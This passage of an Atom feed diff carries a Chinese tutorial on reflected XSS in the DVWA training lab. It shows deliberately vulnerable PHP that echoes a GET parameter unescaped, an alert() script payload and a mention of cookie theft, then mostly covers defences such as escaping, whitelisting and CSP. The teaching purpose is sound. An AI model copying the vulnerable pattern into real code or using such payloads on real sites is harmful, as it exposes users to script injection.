class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;pre&amp;gt;Hello &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[ &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt; ] . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;/pre&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;1-漏洞原因&#34;&gt;&lt;a href=&#34;#1-漏洞原因&#34; class=&#34;headerlink&#34; title=&#34;1. 漏洞原因&#34;&gt;&lt;/a&gt;1. 漏洞原因&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用户输入未过滤&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$_GET[&amp;#39;name&amp;#39;]&lt;/code&gt; 直接拼接到 &lt;code&gt;echo&lt;/code&gt; 输出。&lt;/li&gt;
+&lt;li&gt;未使用 &lt;code&gt;htmlspecialchars()&lt;/code&gt; 等转义函数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;浏览器解析&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;输出如 &lt;code&gt;Hello &amp;lt;script&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;，浏览器执行 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;缺乏安全机制&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;未启用 CSP 或 X-XSS-Protection（尽管代码中有头，但设置为 0，表示禁用）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-源码问题扩展&#34;&gt;&lt;a href=&#34;#2-源码问题扩展&#34; class=&#34;headerlink&#34; title=&#34;2. 源码问题扩展&#34;&gt;&lt;/a&gt;2. 源码问题扩展&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;在实际应用中，类似漏洞常见于搜索结果、错误页面或表单反馈。&lt;/li&gt;
+&lt;li&gt;如果结合文件上传，可上传恶意脚本并反射执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、如何防御反射型-XSS？&#34;&gt;&lt;a href=&#34;#七、如何防御反射型-XSS？&#34; class=&#34;headerlink&#34; title=&#34;七、如何防御反射型 XSS？&#34;&gt;&lt;/a&gt;七、如何防御反射型 XSS？&lt;/h2&gt;&lt;h3 id=&#34;1-输入过滤与输出转义&#34;&gt;&lt;a href=&#34;#1-输入过滤与输出转义&#34; class=&#34;headerlink&#34; title=&#34;1. 输入过滤与输出转义&#34;&gt;&lt;/a&gt;1. 输入过滤与输出转义&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;使用 htmlspecialchars&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$name&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;htmlspecialchars&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;], ENT_QUOTES, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello &amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$name&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;转义特殊字符：&lt;code&gt;&amp;lt;&lt;/code&gt; -&amp;gt; &lt;code&gt;&amp;amp;lt;&lt;/code&gt;；&lt;code&gt;&amp;quot;&lt;/code&gt; -&amp;gt; &lt;code&gt;&amp;amp;quot;&lt;/code&gt; 等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-白名单校验&#34;&gt;&lt;a href=&#34;#2-白名单校验&#34; class=&#34;headerlink&#34; title=&#34;2. 白名单校验&#34;&gt;&lt;/a&gt;2. 白名单校验&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;限制用户输入为预定义值：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$allowed_names&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Alice&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Bob&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Charlie&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$name&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;] ?? &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$name&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$allowed_names&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello &amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$name&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello Guest&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-内容安全策略（CSP）&#34;&gt;&lt;a href=&#34;#3-内容安全策略（CSP）&#34; class=&#34;headerlink&#34; title=&#34;3. 内容安全策略（CSP）&#34;&gt;&lt;/a&gt;3. 内容安全策略（CSP）&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;配置 CSP 头&lt;/strong&gt;：&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Security-Policy&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;default-src &amp;#x27;self&amp;#x27;; script-src &amp;#x27;self&amp;#x27;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;禁止内联脚本和外部脚本执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;PHP 中添加：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Content-Security-Policy: default-src &amp;#x27;self&amp;#x27;;&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-避免直接反射用户输入&#34;&gt;&lt;a href=&#34;#4-避免直接反射用户输入&#34; class=&#34;headerlink&#34; title=&#34;4. 避免直接反射用户输入&#34;&gt;&lt;/a&gt;4. 避免直接反射用户输入&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;使用模板引擎（如 Twig）自动转义输出。&lt;/li&gt;
+&lt;li&gt;将用户输入存储在变量中，避免直接拼接 HTML。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-浏览器防护&#34;&gt;&lt;a href=&#34;#5-浏览器防护&#34; class=&#34;headerlink&#34; title=&#34;5. 浏览器防护&#34;&gt;&lt;/a&gt;5. 浏览器防护&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;启用 X-XSS-Protection：&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;1; mode=block&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;使用现代浏览器（如 Chrome）的内置 XSS 过滤器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;6-工具推荐&#34;&gt;&lt;a href=&#34;#6-工具推荐&#34; class=&#34;headerlink&#34; title=&#34;6. 工具推荐&#34;&gt;&lt;/a&gt;6. 工具推荐&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;：拦截请求，测试 Payload。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;XSS Hunter&lt;/strong&gt;：自动化测试反射型 XSS。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;OWASP ZAP&lt;/strong&gt;：扫描 XSS 漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;八、知识点小结&#34;&gt;&lt;a href=&#34;#八、知识点小结&#34; class=&#34;headerlink&#34; title=&#34;八、知识点小结&#34;&gt;&lt;/a&gt;八、知识点小结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;项目&lt;/th&gt;
+&lt;th&gt;内容&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;反射型 XSS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;用户输入未过滤直接反射到页面执行&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;靶场&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;DVWA 的 XSS（Reflected）模块&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;窃取 Cookie、页面篡改、钓鱼攻击&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;防御&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;过滤、转义、CSP、安全编码规范&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;反射型 XSS 漏洞因其简单性和广泛存在而备受关注。DVWA 的 XSS (Reflected) 模块通过直接反射用户输入，展示了漏洞的典型触发方式。攻击者可通过构造恶意 URL 执行脚本，窃取信息。开发者应采用输出转义、白名单校验和 CSP 等措施，构建多层次防御体系。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供合法授权的渗透测试和安全研究，严禁用于非法用途！&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="Web安全" />
+        <category term="漏洞利用" />
+        <category term="XSS" />
+        <category term="DVWA" />
+        <category term="反射型XSS" />
+        <category term="安全防护" />
+        <updated>2025-08-09T13:20:47.000Z</updated>
+    </entry>
+</feed>
